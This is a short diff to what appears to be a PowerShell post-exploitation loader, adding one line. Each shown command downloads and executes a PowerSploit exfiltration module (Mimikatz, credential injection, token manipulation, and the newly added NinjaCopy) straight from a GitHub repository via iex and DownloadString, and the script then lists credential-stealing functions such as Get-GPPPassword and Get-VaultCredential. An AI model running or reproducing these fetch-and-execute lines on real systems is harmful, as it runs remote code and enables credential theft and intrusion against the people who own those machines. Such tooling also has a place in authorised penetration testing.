@@ -5,6 +5,7 @@ iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-CredentialInjection.ps1')
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Redfast/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1')
 echo "Imported :"
 echo "  Get-GPPPassword"
 echo "  Get-VaultCredential"
